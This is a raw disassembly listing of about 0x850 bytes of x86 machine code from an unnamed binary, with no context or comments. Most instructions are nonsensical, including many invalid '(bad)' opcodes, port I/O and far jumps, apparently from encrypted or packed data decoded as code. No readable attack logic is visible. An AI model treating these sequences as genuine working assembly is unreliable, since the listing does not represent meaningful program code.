  408bbe:	stc    
  408bbf:	xlat   BYTE PTR ds:[ebx]
  408bc0:	aad    0xd6
  408bc2:	out    dx,al
  408bc3:	std    
  408bc4:	mov    ebp,0xc1c2efb4
  408bc9:	clc    
  408bca:	in     al,0xe5
  408bcc:	add    al,al
  408bce:	jecxz  0x408ba4
  408bd0:	(bad)
  408bd3:	jecxz  0x408bbc
  408bd5:	retf   0xe1e3
  408bd8:	into   
  408bd9:	mov    dl,0xc1
  408bdb:	lock leave 
  408bdd:	out    0xe5,al
  408bdf:	fcmovu st,st(6)
  408be1:	jmp    0xf2e0:0x2e8c4ec
  408be8:	into   
  408be9:	sar    ecx,cl
  408beb:	add    esi,edi
  408bed:	fsubr  st(4),st
  408bef:	retf   
  408bf0:	(bad)  
  408bf2:	or     ebx,ebx
  408bf4:	cld    
  408bf5:	add    al,0xaa
  408bf7:	(bad)
  408bfb:	mov    dh,0xce
  408bfd:	stc    
  408bfe:	into   
  408bff:	int3   
  408c00:	shl    eax,1
  408c02:	retf   
  408c03:	mov    dh,0xcd
  408c05:	sti    
  408c06:	(bad)  
  408c07:	mov    esi,0xd2d4d3fe
  408c0c:	(bad)  
  408c0d:	(bad)  
  408c0e:	(bad)  
  408c0f:	xlat   BYTE PTR ds:[ebx]
  408c10:	(bad)  
  408c12:	int    0xec
  408c14:	in     al,dx
  408c15:	int    0xdf
  408c17:	in     eax,dx
  408c18:	loope  0x408be5
  408c1a:	out    dx,al
  408c1b:	mov    ah,0xd6
  408c1d:	retf   
  408c1e:	loope  0x408bf8
  408c20:	fucomip st,st(2)
  408c22:	(bad)
  408c25:	mov    ah,0xb7
  408c27:	(bad)  
  408c29:	loope  0x408c1e
  408c2b:	(bad)  
  408c2d:	add    al,0xd7
  408c2f:	loop   0x408c00
  408c31:	lds    eax,FWORD PTR [ebx]
  408c33:	loopne 0x408c2e
  408c35:	or     edx,ecx
  408c37:	(bad)  
  408c38:	leave  
  408c39:	test   cl,0xb3
  408c3c:	loope  0x408c23
  408c3e:	loopne 0x408c15
  408c40:	mov    edi,0xfabbd7b6
  408c45:	mov    ebx,0xc0dafcf5
  408c4a:	(bad)  
  408c4c:	loop   0x408c14
  408c4e:	(bad)  
  408c4f:	loopne 0x408c39
  408c51:	add    DWORD PTR [eax],ecx
  408c53:	or     esp,ebp
  408c55:	add    dl,al
  408c57:	mov    esi,0xd2d6ead1
  408c5c:	leave  
  408c5d:	div    bh
  408c5f:	retf   0xeafe
  408c62:	vpaddd ymm5,ymm5,ymm1
  408c66:	mov    esi,0xf107f7c8
  408c6b:	mov    esi,0xefbfe5df
  408c70:	add    eax,esp
  408c72:	stc    
  408c73:	jmp    esp
  408c75:	or     edi,DWORD PTR [esi-0x2a1c2e37]
  408c7b:	scas   al,BYTE PTR es:[edi]
  408c7c:	into   
  408c7d:	into   
  408c7e:	iret   
  408c7f:	aad    0xf0
  408c81:	lock repnz sti 
  408c84:	sti    
  408c85:	int    0xf7
  408c87:	add    al,BYTE PTR [edx]
  408c89:	aad    0xf9
  408c8b:	inc    BYTE PTR [edx]
  408c8d:	rol    BYTE PTR [edi+ebx*8],1
  408c90:	fst    st(6)
  408c92:	ret    
  408c93:	in     eax,dx
  408c94:	(bad)
  408c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c98:	fsubr  QWORD PTR [esi-0x103b1e37]
  408c9e:	repz out dx,al
  408ca0:	(bad)  
  408ca2:	fcomip st,st(6)
  408ca4:	shl    cl,1
  408ca6:	(bad)  
  408ca8:	(bad)  
  408ca9:	loop   0x408caf
  408cab:	mov    ebp,0xe0e1e0bd
  408cb0:	fcmovb st,st(5)
  408cb2:	cld    
  408cb3:	enter  0x5c1,0xbc
  408cb7:	jecxz  0x408cb0
  408cb9:	rcr    ebp,cl
  408cbb:	(bad)  
  408cbc:	call   0xd73748a6
  408cc1:	jmp    0xf2e9:0xe2dfffdd
  408cc8:	fdivp  st(6),st
  408cca:	jmp    ecx
  408ccc:	fnstsw WORD PTR [eax-0x25233b37]
  408cd2:	or     al,BYTE PTR [ecx]
  408cd4:	jecxz  0x408cb7
  408cd6:	loopne 0x408ca4
  408cd8:	mov    cl,0xc8
  408cda:	fst    st(5)
  408cdc:	mov    bl,0xda
  408cde:	int    0xc6
  408ce0:	ror    bh,1
  408ce2:	int    0xf1
  408ce4:	sar    edi,cl
  408ce6:	in     al,dx
  408ce7:	call   0xc40389ae
  408cec:	add    al,0xf2
  408cee:	mov    esi,0xccfde908
  408cf4:	add    eax,0xb7c6c4e4
  408cf9:	repz (bad) [edx-0x3a0c2a54]
  408d00:	(bad)  
  408d02:	iret   
  408d03:	rcr    bl,cl
  408d05:	mov    al,0xf8
  408d07:	cli    
  408d08:	icebp  
  408d09:	stc    
  408d0a:	inc    esp
  408d0c:	(bad)  
  408d0d:	loope  0x408d1a
  408d0f:	(bad)  
  408d11:	iret   
  408d12:	aad    0xe5
  408d14:	jecxz  0x408d29
  408d16:	fadd   st,st(1)
  408d18:	retf   0xc3c4
  408d1b:	rol    bl,1
  408d1d:	repnz stc 
  408d1f:	dec    esi
  408d21:	mov    eax,0xf8ebf6bd
  408d26:	add    esp,eax
  408d28:	rol    edx,cl
  408d2a:	in     eax,0xf1
  408d2c:	jmp    0xede:0xd9c5f9e4
  408d33:	or     al,0xfa
  408d35:	shl    bh,0xaf
  408d38:	shl    ah,1
  408d3a:	jmp    0xe8217bfb
  408d3f:	out    0xb1,eax
  408d41:	rcl    bl,cl
  408d43:	in     eax,dx
  408d44:	iret   
  408d45:	add    DWORD PTR [edx],eax
  408d47:	jecxz  0x408d3f
  408d49:	aam    0xfe
  408d4b:	fucom  st(6)
  408d4d:	out    0x3,eax
  408d4f:	lock pinsrw mm1,WORD PTR [edi+ecx*1],0xc
  408d55:	pop    es
  408d56:	int3   
  408d57:	loopne 0x408d28
  408d59:	call   0xda055513
  408d5e:	(bad)  
  408d5f:	mov    ah,0xf2
  408d61:	mov    ch,0xec
  408d63:	mov    ecx,0xd3c9fbb1
  408d68:	out    dx,al
  408d69:	ffree  st(5)
  408d6b:	mov    esi,0xfbf1f9
  408d70:	out    0xf,eax
  408d72:	fninit 
  408d74:	leave  
  408d75:	or     bl,cl
  408d77:	iret   
  408d78:	loope  0x408d3d
  408d7a:	lds    ebp,FWORD PTR [edx-0x2b4d1f0c]
  408d80:	out    0xde,eax
  408d82:	(bad)
  408d85:	sar    ebp,1
  408d87:	cli    
  408d88:	fst    st(3)
  408d8a:	lds    edi,FWORD PTR [esp+edi*4+0x205c2e2]
  408d91:	jmp    0x408d67
  408d93:	out    0xf8,eax
  408d95:	fistp  QWORD PTR [eax-0x1a52090d]
  408d9b:	out    0xd2,al
  408d9d:	cmc    
  408d9e:	into   
  408d9f:	in     eax,0xbb
  408da1:	mov    eax,0xbaeddfb4
  408da6:	in     eax,dx
  408da7:	fild   DWORD PTR [edx]
  408da9:	int3   
  408daa:	repz cmc 
  408dac:	aad    0xf8
  408dae:	std    
  408daf:	jmp    0xeaf8:0xbe2fadd
  408db6:	out    0xc7,al
  408db8:	test   al,0xca
  408dba:	retf   
  408dbb:	enter  0xe9ee,0xc9
  408dbf:	vpaddsb xmm1,xmm6,xmm1
  408dc3:	rcl    eax,1
  408dc5:	aad    0xce
  408dc7:	xlat   BYTE PTR ds:[ebx]
  408dc8:	fld    DWORD PTR [ecx]
  408dca:	vpsubusb ymm1,ymm5,YMMWORD PTR [ebx]
  408dce:	jmp    0xbc6:0xc9e8cf0f
  408dd5:	retf   
  408dd6:	test   al,0xdf
  408dd8:	imul   ah
  408dda:	rol    ebp,0xf0
  408ddd:	ret    0xb5d1
  408de0:	rcl    dl,cl
  408de2:	imul   ch
  408de4:	int    0xb0
  408de6:	ret    0xbdcd
  408de9:	shl    dl,0xf6
  408dec:	add    DWORD PTR [ecx],eax
  408dee:	in     eax,0xfd
  408df0:	loopne 0x408df8
  408df2:	add    eax,0xc006e6dc
  408df7:	mov    ebp,0xc6b2cead
  408dfc:	loop   0x408db9
  408dfe:	into   
  408dff:	int    0xb8
  408e01:	ror    ebx,cl
  408e03:	jmp    0x408de3
  408e05:	hlt    
  408e06:	fcmove st,st(5)
  408e08:	mov    edi,0xebfbe6dd
  408e0d:	neg    eax
  408e0f:	inc    DWORD PTR [esi]
  408e11:	fadd   QWORD PTR [esp+eax*8]
  408e14:	out    dx,eax
  408e15:	pop    es
  408e16:	(bad)  
  408e17:	mov    al,0xb0
  408e19:	shl    dl,cl
  408e1b:	out    dx,eax
  408e1c:	mov    ch,0xee
  408e1e:	fxch   st(4)
  408e20:	(bad)  
  408e21:	mov    ch,0xed
  408e23:	cmc    
  408e24:	cli    
  408e25:	rcl    bl,1
  408e27:	sti    
  408e28:	fsubrp st(1),st
  408e2a:	in     al,dx
  408e2b:	cld    
  408e2c:	pop    es
  408e2d:	idiv   bl
  408e2f:	in     eax,0xdc
  408e31:	jecxz  0x408e1e
  408e33:	pop    es
  408e34:	push   es
  408e35:	retf   0xbdb3
  408e38:	div    ch
  408e3a:	call   0xb7e98402
  408e3f:	in     eax,0xb9
  408e41:	mov    dh,0xcd
  408e43:	icebp  
  408e44:	lock mov edi,0xd0fcefe1
  408e4a:	(bad)  
  408e4b:	fcom   st(1)
  408e4d:	(bad)  
  408e4f:	idiv   ebx
  408e51:	fsubr  st,st(3)
  408e53:	add    ecx,DWORD PTR [ebx]
  408e55:	(bad)  
  408e56:	mov    bl,0xf0
  408e58:	loopne 0x408e1c
  408e5a:	repz (bad) [ecx-0x192f384c]
  408e61:	fmulp  st(3),st
  408e63:	push   esp
  408e65:	ror    ebp,cl
  408e67:	(bad)  
  408e69:	sar    ebp,1
  408e6b:	mov    esp,0xdc0afdda
  408e70:	out    dx,eax
  408e71:	aam    0x6
  408e73:	push   es
  408e74:	fisttp QWORD PTR [edx+edx*8]
  408e77:	shl    ebx,cl
  408e79:	loope  0x408e52
  408e7b:	repz loope 0x408e43
  408e7e:	stc    
  408e7f:	loopne 0x408e66
  408e81:	jmp    0x408e40
  408e83:	neg    edi
  408e85:	mov    edi,0xc3fcbefd
  408e8a:	(bad)  
  408e8b:	clc    
  408e8c:	add    ebx,ebx
  408e8e:	or     ch,al
  408e90:	clc    
  408e91:	retf   0xf4f8
  408e94:	jmp    0xad066c9f
  408e99:	out    0xc4,al
  408e9b:	mov    dh,0xe7
  408e9d:	cli    
  408e9e:	shr    dl,cl
  408ea0:	mov    eax,0xd0d8dcc9
  408ea5:	ret    
  408ea6:	fcomp  st(7)
  408ea8:	(bad)  
  408ea9:	repz lock add esp,edi
  408ead:	(bad)  
  408eaf:	ret    0xff7
  408eb2:	mov    BYTE PTR [ebx],0xd8
  408eb5:	stc    
  408eb6:	leave  
  408eb7:	ret    0xf0c1
  408eba:	mov    bh,0xc7
  408ebc:	in     al,dx
  408ebd:	mov    bh,0xd3
  408ebf:	(bad)  
  408ec0:	mov    al,0xd5
  408ec2:	(bad)  
  408ec3:	(bad)  
  408ec4:	cld    
  408ec5:	(bad)  
  408ec6:	call   0xde1d8c9c
  408ecb:	mov    esi,0xdfd7f7da
  408ed0:	cld    
  408ed1:	fcmovnu st,st(7)
  408ed3:	std    
  408ed4:	loopne 0x408ed0
  408ed6:	rol    edx,cl
  408ed8:	ror    ebx,1
  408eda:	fst    st(5)
  408edc:	sar    ebx,1
  408ede:	rcr    edi,1
  408ee0:	repnz sar BYTE PTR [esi-0x21360005],cl
  408ee7:	ret    
  408ee8:	pop    es
  408ee9:	mov    ah,0xf7
  408eeb:	add    eax,DWORD PTR [esi]
  408eed:	(bad)  
  408eee:	or     bh,dh
  408ef0:	or     ebx,edi
  408ef2:	jecxz  0x408edc
  408ef4:	or     bl,ah
  408ef6:	in     eax,0xc2
  408ef8:	retf   0xcdb1
  408efb:	jmp    0x408ec9
  408efd:	int    0xfa
  408eff:	iret   
  408f00:	aam    0xd9
  408f02:	cmc    
  408f03:	(bad)  
  408f04:	mov    esi,0xdeda0203
  408f09:	(bad)  
  408f0a:	aad    0xd3
  408f0c:	hlt    
  408f0d:	hlt    
  408f0e:	add    ch,bl
  408f10:	out    0xfb,eax
  408f12:	pop    es
  408f13:	clc    
  408f14:	(bad)  
  408f15:	jmp    0xf5f241fa
  408f1a:	int    0xca
  408f1c:	xlat   BYTE PTR ds:[ebx]
  408f1d:	shl    DWORD PTR [edx-0xc2e3a19],1
  408f23:	into   
  408f24:	ret    
  408f25:	sar    BYTE PTR [ebx+edx*8-0x2141fe2b],cl
  408f2c:	ret    
  408f2d:	add    al,ah
  408f2f:	out    0xe5,al
  408f31:	std    
  408f32:	cld    
  408f33:	leave  
  408f34:	add    BYTE PTR [ecx],dl
  408f36:	(bad)  
  408f37:	loopne 0x408efe
  408f39:	loopne 0x408f06
  408f3b:	iret   
  408f3c:	(bad)  
  408f3f:	neg    edi
  408f41:	xlat   BYTE PTR ds:[ebx]
  408f42:	int    0xc8
  408f44:	call   0xbd317020
  408f49:	(bad)  
  408f4b:	fcomip st,st(0)
  408f4d:	jmp    0x408f39
  408f4f:	jmp    0x3199f4d
  408f54:	stc    
  408f55:	push   cs
  408f56:	mov    cl,0xb1
  408f58:	jmp    0xeccf:0xf0d7d0d0
  408f5f:	repz repz mov dh,0xbe
  408f63:	cld    
  408f64:	idiv   ebx
  408f66:	enter  0xf6e2,0xd5
  408f6a:	shr    ebx,0xe0
  408f6d:	shl    esp,1
  408f6f:	enter  0xcfef,0xe8
  408f73:	fild   WORD PTR [ebx]
  408f75:	in     eax,dx
  408f76:	lods   al,BYTE PTR ds:[esi]
  408f77:	call   0xce157444
  408f7c:	int3   
  408f7d:	iret   
  408f7e:	in     eax,dx
  408f7f:	int3   
  408f80:	rcr    dl,1
  408f82:	mov    ecx,0xb7fad4da
  408f87:	loopne 0x408f90
  408f89:	pop    es
  408f8a:	fdivr  st,st(6)
  408f8c:	mov    ecx,0xdae1f8ca
  408f91:	in     al,0xec
  408f93:	(bad)  
  408f95:	out    0xed,al
  408f97:	mov    cl,0xe9
  408f99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f9a:	icebp  
  408f9b:	mov    cl,0xe8
  408f9d:	lods   al,BYTE PTR ds:[esi]
  408f9e:	in     al,dx
  408f9f:	in     al,dx
  408fa0:	(bad)  
  408fa1:	(bad)  
  408fa2:	neg    ah
  408fa4:	iret   
  408fa5:	loope  0x408f68
  408fa7:	loope  0x408f9f
  408fa9:	shl    edi,0xe6
  408fac:	mov    ebp,0xbde2fee4
  408fb1:	iret   
  408fb2:	jmp    0xc8539fa2
  408fb7:	(bad)  [eax-0x3f3f2e0b]
  408fbd:	iret   
  408fbe:	mov    cl,0xf9
  408fc0:	vpaddw ymm3,ymm6,ymm1
  408fc4:	cli    
  408fc5:	ret    
  408fc6:	mov    ebx,0x2f2ccdd
  408fcb:	add    ebx,esi
  408fcd:	clc    
  408fce:	out    0xef,eax
  408fd0:	(bad)  
  408fd1:	mov    esp,0x3070200
  408fd6:	ret    0xe7f1
  408fd9:	out    0xf4,al
  408fdb:	enter  0xceeb,0xca
  408fdf:	xbegin 0xc0175dab
  408fe5:	mov    ebp,0xe0ef07f8
  408fea:	aam    0x4
  408fec:	fnstsw ax
  408fee:	in     eax,0xb
  408ff0:	push   es
  408ff1:	cmc    
  408ff2:	(bad)  
  408ff3:	jmp    0xb2fa6dc6
  408ff8:	ret    
  408ff9:	rcl    ch,0xf4
  408ffc:	out    0xed,al
  408ffe:	mov    ebx,0xccead6f2
  409003:	rcr    ah,cl
  409005:	mov    ah,0xf0
  409007:	rcl    cl,cl
  409009:	mul    ebp
  40900b:	rol    BYTE PTR [ebx],cl
  40900d:	imul   bl
  40900f:	les    eax,FWORD PTR [ebx]
  409011:	or     DWORD PTR [eax],eax
  409013:	or     BYTE PTR [ebx],al
  409015:	add    ebx,edx
  409017:	stos   BYTE PTR es:[edi],al
  409018:	loope  0x408fe0
  40901a:	in     eax,0xfb
  40901c:	mov    ah,0xe4
  40901e:	in     eax,0xd9
  409020:	hlt    
  409021:	retf   
  409022:	std    
  409023:	std    
  409024:	(bad)  
  409026:	xlat   BYTE PTR ds:[ebx]
  409027:	out    dx,al
  409028:	hlt    
  409029:	repnz in eax,0x6
  40902c:	shr    dl,0xe0
  40902f:	mul    eax
  409031:	clc    
  409032:	jmp    0x40900f
  409034:	out    dx,eax
  409035:	fcmovb st,st(4)
  409037:	lock fsubrp st(1),st
  40903a:	loope  0x40900f
  40903c:	ret    
  40903d:	loopne 0x409024
  40903f:	cli    
  409040:	lock retf 
  409042:	jmp    0x408ffe
  409044:	mov    esi,0xddd9f5de
  409049:	(bad)  
  40904b:	cmc    
  40904c:	stc    
  40904d:	jmp    0x40902c
  40904f:	add    ebx,edx
  409051:	in     eax,0xe8
  409053:	or     eax,0xdcdff3ff
  409058:	ret    
  409059:	rcl    ah,cl
  40905b:	aad    0xee
  40905d:	int3   
  40905e:	idiv   ecx
  409060:	into   
  409061:	mov    al,0xbb
  409063:	std    
  409064:	jmp    0x409059
  409066:	repz mov edi,0x201e3ce
  40906c:	(bad)  
  40906d:	hlt    
  40906e:	aam    0x5
  409070:	(bad)  
  409071:	cli    
  409072:	pop    es
  409073:	adc    eax,DWORD PTR [esp+edi*8]
  409076:	loope  0x40902a
  409078:	fadd   st(0),st
  40907a:	(bad)  
  40907c:	mov    ebx,0xeaffb5fb
  409081:	mov    ebx,0xeaf2beee
  409086:	loopne 0x409040
  409088:	out    0xd3,eax
  40908a:	loope  0x40908b
  40908c:	rcl    bh,cl
  40908e:	fucom  st(5)
  409090:	(bad)  
  409091:	in     eax,0xc9
  409093:	psraw  mm1,mm2
  409096:	fsubrp st(3),st
  409098:	xlat   BYTE PTR ds:[ebx]
  409099:	into   
  40909a:	fdiv   QWORD PTR [ecx+esi*8-0x432481f]
  4090a1:	aad    0xfe
  4090a3:	(bad)  
  4090a4:	cli    
  4090a5:	mov    al,0xe2
  4090a7:	sti    
  4090a8:	std    
  4090a9:	fdiv   st,st(5)
  4090ab:	xlat   BYTE PTR ds:[ebx]
  4090ac:	loop   0x409099
  4090ae:	cld    
  4090af:	aad    0xc5
  4090b1:	out    0xe0,eax
  4090b3:	(bad)  
  4090b4:	(bad)  [eax]
  4090b6:	scas   eax,DWORD PTR es:[edi]
  4090b7:	out    dx,al
  4090b8:	(bad)  
  4090ba:	mov    dl,0xf0
  4090bc:	xlat   BYTE PTR ds:[ebx]
  4090bd:	mov    al,0xb4
  4090bf:	repz mov ecx,0xe9d4f0f3
  4090c5:	shr    dh,1
  4090c7:	pop    es
  4090c8:	std    
  4090c9:	fcmovnu st,st(3)
  4090cb:	(bad)
  4090ce:	(bad)
  4090d2:	jmp    0xc8e3:0xaf0ec8ff
  4090d9:	fsubp  st(7),st
  4090db:	out    0xd1,al
  4090dd:	jmp    0xd73f63cb
  4090e2:	mov    ecx,0xf6b4d2f2
  4090e7:	fdivrp st(2),st
  4090e9:	ret    0xbcc
  4090ec:	(bad)  
  4090ed:	jmp    eax
  4090ef:	ror    bh,1
  4090f1:	inc    DWORD PTR [ebx+ebp*8]
  4090f4:	push   cs
  4090f5:	or     ah,ch
  4090f7:	repnz ror ch,cl
  4090fa:	lods   al,BYTE PTR ds:[esi]
  4090fb:	ror    edi,1
  4090fd:	leave  
  4090fe:	icebp  
  4090ff:	in     eax,dx
  409100:	(bad)  
  409101:	lods   al,BYTE PTR ds:[esi]
  409102:	into   
  409103:	aam    0xea
  409105:	mov    ecx,0xeddfc0f9
  40910a:	ret    
  40910b:	mov    edx,0xf8f10a0a
  409110:	div    ch
  409112:	jmp    0xbc4e991c
  409117:	fucom  st(4)
  409119:	(bad)  
  40911a:	(bad)  
  40911b:	retf   
  40911c:	in     al,0xee
  40911e:	retf   
  40911f:	in     eax,0xd5
  409121:	fsqrt  
  409123:	in     eax,dx
  409124:	mov    ebx,0xc7bdddd4
  409129:	out    dx,al
  40912a:	mov    ebx,0xfdd9f3c5
  40912f:	std    
  409130:	push   es
  409131:	add    ebx,ecx
  409133:	jmp    0xe5fe521e
  409138:	leave  
  409139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40913a:	(bad)
  40913e:	out    dx,eax
  40913f:	(bad)  
  409140:	fsubp  st(5),st
  409142:	(bad)  
  409144:	(bad)  
  409145:	int    0xd1
  409147:	ffree  st(7)
  409149:	in     eax,dx
  40914a:	fdivr  st,st(6)
  40914c:	push   es
  40914d:	fdecstp 
  40914f:	idiv   dh
  409151:	(bad)  
  409153:	sti    
  409154:	lds    eax,FWORD PTR [esi]
  409156:	shl    edi,1
  409158:	in     al,0xd1
  40915a:	div    bh
  40915c:	fcmovnb st,st(0)
  40915e:	loope  0x409130
  409160:	out    0xd6,eax
  409162:	std    
  409163:	aad    0xb1
  409165:	jmp    0xdbe0:0xccfad3ef
  40916c:	rcr    eax,1
  40916e:	ret    
  40916f:	hlt    
  409170:	rol    esi,0xc4
  409173:	clc    
  409174:	sar    esi,0xbf
  409177:	loopne 0x409128
  409179:	(bad)  
  40917a:	in     al,0xd4
  40917c:	enter  0xb3e7,0xf8
  409180:	out    0xca,eax
  409182:	int3   
  409183:	retf   0x1d0
  409186:	fsubr  st,st(7)
  409188:	fidiv  WORD PTR [edx+eax*8+0x5fff1dc]
  40918f:	jmp    0x409178
  409191:	fild   WORD PTR ds:0xddef1202
  409197:	jmp    0xb7c1:0xf7cdd7d6
  40919e:	(bad)  
  40919f:	(bad)  
  4091a0:	mov    eax,0x2d2f3dd
  4091a5:	add    ebx,esp
  4091a7:	enter  0x3d1,0xf2
  4091ab:	add    eax,edi
  4091ad:	fstp   st(3)
  4091af:	loopne 0x409177
  4091b1:	fmulp  st(1),st
  4091b3:	stc    
  4091b4:	sar    edx,cl
  4091b6:	ret    0xccd1
  4091b9:	(bad)  
  4091ba:	shl    eax,cl
  4091bc:	loope  0x40918b
  4091be:	div    dl
  4091c0:	in     al,dx
  4091c1:	retf   
  4091c2:	call   0xba437cb9
  4091c7:	jecxz  0x4091ca
  4091c9:	cld    
  4091ca:	(bad)
  4091cd:	jmp    0xdc3070a6
  4091d2:	add    al,0xe2
  4091d4:	vpsllq xmm5,xmm1,xmm5
  4091d8:	repz loope 0x4091c2
  4091db:	mov    cl,0xc5
  4091dd:	mov    bl,0xf7
  4091df:	ror    eax,cl
  4091e1:	fcmovu st,st(4)
  4091e3:	mov    esi,0xbfed02dc
  4091e8:	(bad)  
  4091e9:	lock out 0xc1,al
  4091ec:	in     eax,0xe3
  4091ee:	retf   0xf8d7
  4091f1:	or     dl,bh
  4091f3:	call   0xf4207fdf
  4091f8:	test   eax,0xe5d6f0a4
  4091fd:	vpslld xmm1,xmm7,xmm6
  409201:	jmp    0xef4068f8
  409206:	enter  0xe3bf,0xd2
  40920a:	cli    
  40920b:	or     edi,ebx
  40920d:	cld    
  40920e:	fadd   QWORD PTR [edx]
  409210:	add    ebx,esp
  409212:	(bad)  
  409214:	fld1   
  409216:	mov    bl,0xbe
  409218:	mov    bl,0xcf
  40921a:	scas   eax,DWORD PTR es:[edi]
  40921b:	lock into 
  40921d:	mov    ebx,0xf4c8d0f7
  409222:	into   
  409223:	retf   
  409224:	clc    
  409225:	jmp    0x2484b05
  40922a:	cld    
  40922b:	idiv   esp
  40922d:	retf   0xa03
  409230:	add    al,al
  409232:	out    dx,eax
  409233:	cli    
  409234:	or     ch,cl
  409236:	leave  
  409237:	xlat   BYTE PTR ds:[ebx]
  409238:	in     eax,dx
  409239:	in     al,0xef
  40923b:	shr    ebx,0xd9
  40923e:	mov    ebx,0xcafdf6ff
  409243:	(bad)  
  409244:	(bad)  
  409246:	(bad)  
  409247:	mov    ebp,0xdcd9dbde
  40924c:	(bad)  
  40924d:	or     edi,edx
  40924f:	jmp    0xe5459559
  409254:	jecxz  0x409216
  409256:	stos   DWORD PTR es:[edi],eax
  409257:	out    dx,eax
  409258:	jmp    0xbaeb:0xc7c4f4d0
  40925f:	mov    ch,0xc4
  409261:	in     al,0xc9
  409263:	lock int 0xf5
  409266:	fcmovnbe st,st(7)
  409268:	(bad)  
  40926a:	mov    esi,0xf4ffbcdb
  40926f:	loopne 0x409271
  409271:	in     eax,dx
  409272:	fiadd  DWORD PTR [edi]
  409274:	(bad)  
  409275:	out    dx,al
  409276:	jecxz  0x409250
  409278:	shl    ebp,cl
  40927a:	ror    bh,0xb1
  40927d:	iret   
  40927e:	test   ecx,0xfef0ffd9
  409284:	idiv   DWORD PTR [edi-0x2402208]
  40928a:	rol    DWORD PTR [esi],1
  40928c:	mov    ecx,0xefc4fdf7
  409291:	hlt    
  409292:	hlt    
  409293:	out    0xb,al
  409295:	or     eax,0xd3ece0b9
  40929a:	icebp  
  40929b:	hlt    
  40929c:	mov    bh,0xac
  40929e:	jmp    0xcdbc:0xfedeeccc
  4092a5:	icebp  
  4092a6:	cli    
  4092a7:	fld    QWORD PTR [edx]
  4092a9:	stc    
  4092aa:	clc    
  4092ab:	loop   0x409297
  4092ad:	add    ecx,ecx
  4092af:	std    
  4092b0:	add    al,ch
  4092b2:	(bad)  
  4092b3:	in     al,dx
  4092b4:	or     BYTE PTR [edi],al
  4092b6:	out    dx,eax
  4092b7:	in     al,dx
  4092b8:	retf   0xd4d2
  4092bb:	out    dx,al
  4092bc:	mov    dh,0xc2
  4092be:	mov    ebx,0xecf5f8f2
  4092c3:	shr    ch,1
  4092c5:	loop   0x4092bc
  4092c7:	mov    edx,0xc1defff2
  4092cc:	or     al,ah
  4092ce:	hlt    
  4092cf:	jmp    0xdc4377bd
  4092d4:	add    al,0xdc
  4092d6:	lock shl eax,0xf0
  4092da:	in     eax,0xd6
  4092dc:	rol    esi,1
  4092de:	loope  0x409292
  4092e0:	sar    DWORD PTR [edx-0x1e30450e],cl
  4092e6:	mov    esi,0xd5f3fac2
  4092eb:	add    edi,edx
  4092ed:	ror    ecx,0xc0
  4092f0:	add    al,0xc6
  4092f2:	in     al,dx
  4092f3:	fucomp st(5)
  4092f5:	add    al,0xaa
  4092f7:	out    dx,eax
  4092f8:	test   al,0xe9
  4092fa:	jmp    0xc10a78ea
  4092ff:	out    0xd4,eax
  409301:	mov    edi,0xf4d0ebce
  409306:	in     al,dx
  409307:	into   
  409308:	inc    DWORD PTR [eax]
  40930a:	neg    ch
  40930c:	repnz hlt 
  40930e:	call   0xe91f59f0
  409313:	repz loop 0x409310
  409316:	in     eax,0xde
  409318:	mov    ebp,0xe3f2afb0
  40931d:	repnz repz clc 
  409320:	lock mov esi,0xddf9ffe9
  409326:	enter  0xe100,0xd4
  40932a:	int3   
  40932b:	jmp    0x409311
  40932d:	xlat   BYTE PTR ds:[ebx]
  40932e:	add    al,0xf7
  409330:	out    0xe2,al
  409332:	retf   0xda04
  409335:	loop   0x4092f8
  409337:	loop   0x409321
  409339:	repz mov dl,0xaa
  40933c:	(bad)  
  40933d:	fxch   st(2)
  40933f:	scas   al,BYTE PTR es:[edi]
  409340:	out    dx,al
  409341:	xlat   BYTE PTR ds:[ebx]
  409342:	icebp  
  409343:	aad    0xed
  409345:	fcomi  st,st(2)
  409347:	(bad)  
  409348:	mov    ch,0xce
  40934a:	(bad)  
  40934b:	fcmovb st,st(3)
  40934d:	(bad)  
  40934e:	leave  
  40934f:	fstp   st(3)
  409351:	add    al,0xc4
  409353:	jmp    0xc628a524
  409358:	div    BYTE PTR [esi-0x530e2d2a]
  40935e:	out    0xf2,eax
  409360:	imul   esi
  409362:	cli    
  409363:	mov    ch,0xfe
  409365:	mov    ebx,0xf4ccf6b8
  40936a:	aad    0x5
  40936c:	std    
  40936d:	shl    ch,cl
  40936f:	rol    cl,0xff
  409372:	ret    
  409373:	in     al,dx
  409374:	shl    edx,0xa9
  409377:	ffreep st(7)
  409379:	jecxz  0x409348
  40937b:	ror    al,0xcb
  40937e:	leave  
  40937f:	div    eax
  409381:	(bad)  
  409382:	idiv   bh
  409384:	stc    
  409385:	fdivr  DWORD PTR [esi-0x212fc3e]
  40938b:	shl    ecx,cl
  40938d:	pop    es
  40938e:	retf   0x9d4
  409391:	add    edi,esi
  409393:	std    
  409394:	shr    esp,cl
  409396:	out    0xcf,eax
  409398:	mov    bl,0xde
  40939a:	mov    dl,0xeb
  40939c:	jecxz  0x409395
  40939e:	jmp    0x409351
  4093a0:	lds    edi,FWORD PTR [ecx-0x42292121]
  4093a6:	add    DWORD PTR [eax-0x2144293e],edi
  4093ac:	shl    bh,0xfc
  4093af:	ret    0xfbd8
  4093b2:	pop    es
  4093b3:	in     eax,0xb
  4093b5:	rcr    cl,0xae
  4093b8:	int    0xe4
  4093ba:	mov    dh,0xd4
  4093bc:	into   
  4093bd:	mov    ah,0xf5
  4093bf:	jmp    0xf53a58af
  4093c4:	clc    
  4093c5:	shr    ebp,1
  4093c7:	(bad)  
  4093c8:	mov    esi,0xf8d4f1cd
  4093cd:	fsubr  st,st(0)
  4093cf:	leave  
  4093d0:	test   DWORD PTR [esi],0xfdea0007
  4093d6:	fptan  
  4093d8:	mov    cl,0xd6
  4093da:	sar    BYTE PTR [ecx+ebp*8-0x8152d18],cl
  4093e1:	aad    0xfe
  4093e3:	cmc    
  4093e4:	out    dx,eax
  4093e5:	int    0xbb
  4093e7:	(bad)  
  4093e9:	ret    
  4093ea:	clc    
  4093eb:	ror    BYTE PTR [edx],1
  4093ed:	cli    
  4093ee:	in     eax,0xe2
  4093f0:	jecxz  0x4093d1
  4093f2:	stc    
  4093f3:	fisttp DWORD PTR [edi]
  4093f5:	jmp    0xe81364db
  4093fa:	out    0xe3,al
  4093fc:	(bad)  
  4093fd:	loopne 0x4093af
  4093ff:	clc    
  409400:	(bad)
  409403:	int    0xf5
  409405:	shl    al,1
  409407:	into   
  409408:	in     al,dx
  409409:	ret    
